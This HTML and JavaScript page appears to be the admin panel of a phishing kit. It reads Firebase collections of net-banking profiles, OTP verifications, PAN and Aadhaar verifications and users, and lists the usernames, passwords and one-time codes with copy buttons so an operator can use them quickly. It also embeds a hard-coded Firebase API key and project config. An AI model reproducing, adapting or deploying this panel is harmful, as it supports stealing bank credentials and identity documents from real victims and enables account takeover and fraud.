<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Admin Panel - Collection View</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 1rem;
      margin: 0;
      background: #f5f5f5;
      color: #000;
    }
    .top-bar {
      display: flex;
      flex-wrap: wrap;
      gap: 10px;
      margin-bottom: 1rem;
    }
    .top-bar button {
      padding: 6px 12px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      background: #333;
      color: white;
      font-weight: bold;
    }
    h2 {
      margin-top: 2rem;
      border-bottom: 2px solid #ccc;
      padding-bottom: 5px;
      color: red;
    }
    .entry {
      background: #ffffff;
      margin-bottom: 10px;
      padding: 10px;
      border-radius: 6px;
      box-shadow: 0 0 5px rgba(0,0,0,0.1);
    }
    .field {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 6px;
      flex-wrap: wrap;
    }
    .label {
      font-weight: bold;
    }
    .timestamp {
      font-size: 0.8rem;
      color: red;
      margin-top: 3px;
    }
    .copy-btn, .delete-btn {
      background: #007bff;
      color: white;
      border: none;
      border-radius: 4px;
      padding: 4px 8px;
      cursor: pointer;
      white-space: nowrap;
      margin-left: auto;
      margin-top: 5px;
    }
    .delete-btn {
      background: #dc3545;
    }
    .section {
      display: none;
    }
  </style>
</head>
<body>
  <div class="top-bar" id="collectionButtons"></div>
  <div id="dataContainer"></div>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
    import { getFirestore, collection, getDocs, deleteDoc, doc, query } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";

    const firebaseConfig = {
      apiKey: "AIzaSyCPm7u8Gw5IK1GuPVZ02pxr5tXG3ik7xoI",
      authDomain: "sbighsh.firebaseapp.com",
      projectId: "sbighsh",
      storageBucket: "sbighsh.appspot.com",
      messagingSenderId: "685947657107",
      appId: "1:685947657107:web:471a0557bb72235272a666"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);
    const collections = ["netbanking_profile", "otp_verifications", "pan_verification", "users", "aadhaar_verifications"];
    const container = document.getElementById("dataContainer");
    const buttonsDiv = document.getElementById("collectionButtons");
    let allEntries = {};

    function createField(key, value) {
      const field = document.createElement("div");
      field.className = "field";

      const label = document.createElement("div");
      label.className = "label";
      label.textContent = `${key}: ${value}`;

      const btn = document.createElement("button");
      btn.className = "copy-btn";
      btn.textContent = "Copy";
      btn.onclick = () => {
        navigator.clipboard.writeText(value);
        btn.textContent = "Copied!";
        setTimeout(() => btn.textContent = "Copy", 1500);
      };

      field.appendChild(label);
      field.appendChild(btn);
      return field;
    }

    function createEntry(entry, colName) {
      const div = document.createElement("div");
      div.className = "entry";

      const displayOrder = ["username", "password", "otp", "profile", "name"];

      displayOrder.forEach(key => {
        if (entry.data[key]) {
          const label = key.charAt(0).toUpperCase() + key.slice(1);
          const field = createField(label, entry.data[key]);
          div.appendChild(field);
        }
      });

      for (const key in entry.data) {
        if (displayOrder.includes(key) || (typeof entry.data[key] === "object" && entry.data[key]?.seconds)) continue;
        const field = createField(key, entry.data[key]);
        div.appendChild(field);
      }

      if (entry.data.timestamp?.seconds) {
        const time = new Date(entry.data.timestamp.seconds * 1000).toLocaleString();
        const timeDiv = document.createElement("div");
        timeDiv.className = "timestamp";
        timeDiv.textContent = `Time: ${time}`;
        div.appendChild(timeDiv);
      }

      return div;
    }

    async function loadData() {
      for (const col of collections) {
        const q = query(collection(db, col));
        const snap = await getDocs(q);
        allEntries[col] = [];
        snap.forEach(docSnap => {
          allEntries[col].push({
            id: docSnap.id,
            data: docSnap.data(),
          });
        });
        allEntries[col].sort((a, b) => (b.data.timestamp?.seconds || 0) - (a.data.timestamp?.seconds || 0));
      }
      createCollectionButtons();
    }

    function createCollectionButtons() {
      collections.forEach(col => {
        const btn = document.createElement("button");
        btn.textContent = col.replace(/_/g, " ").toUpperCase();
        btn.onclick = () => showCollection(col);
        buttonsDiv.appendChild(btn);
      });
    }

    function showCollection(col) {
      container.innerHTML = "";
      const section = document.createElement("div");
      section.className = "section";
      section.style.display = "block";

      const heading = document.createElement("h2");
      heading.textContent = col.toUpperCase();
      section.appendChild(heading);

      allEntries[col].forEach(entry => {
        const div = createEntry(entry, col);
        section.appendChild(div);
      });

      container.appendChild(section);
    }

    await loadData();
  </script>
</body>
</html>